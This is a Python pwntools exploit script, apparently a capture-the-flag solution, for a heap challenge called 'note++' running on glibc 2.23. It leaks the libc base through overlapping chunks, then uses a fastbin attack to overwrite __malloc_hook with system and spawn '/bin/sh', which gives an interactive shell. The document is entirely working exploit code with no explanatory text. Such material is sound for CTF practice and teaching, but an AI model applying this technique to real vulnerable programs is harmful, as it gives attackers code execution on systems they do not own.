from pwn import * 

def add(size, note, desc):
    r.sendafter('> ', '1')
    r.sendafter('Size: ', str(size))
    r.sendafter('Note: ', note)
    r.sendafter('Description of this note: ', desc + '\n')

def delete(index):
    r.sendafter('>', '3')
    r.sendafter('Index: ', str(index))

def llist():
    r.sendafter('>', '2')

# nc edu-ctf.csie.org 10181
context.arch = 'amd64'
r = process('./note++')
# r = remote('edu-ctf.csie.org', 10181)

l = ELF('./libc-2.23.so')

# leak libc 
add(0x10, 'a', 'a')
add(0x50, 'c', 'merge0')
add(0x50, 'c', 'merge1')
add(0x10, 'a', 'a')
delete(0)
add(0, 'a' * 0x18 + p64(0xc1), 'a')
delete(1)
delete(0)
add(0x10, 'a', 'a' * 48)
llist()
r.recvuntil('Data: ')
r.recvuntil('Data: ')
l.address = u64(r.recv(6) + '\0\0') - 0x3c4b78
success('libc base : {}'.format(hex(l.address)))

# fastbin attack

add(0x40, 'a', 'a') #4
add(0x68, 'a', 'a') #5
add(0x68, 'a', 'a') #6

delete(5)
delete(6)
delete(4)
add(0x30, 'a', 'a' * 48)
delete(5)

add(0x68, p64(l.sym.__malloc_hook - 0x10 - 3), 'a')
add(0x68, 'a', 'a')
add(0x68, 'a', 'a')
add(0x68, 'aaa' + p64(l.sym.system), 'a')
r.sendafter('> ', '1')
r.sendafter('Size: ', str(l.search('/bin/sh').next()))



r.interactive()



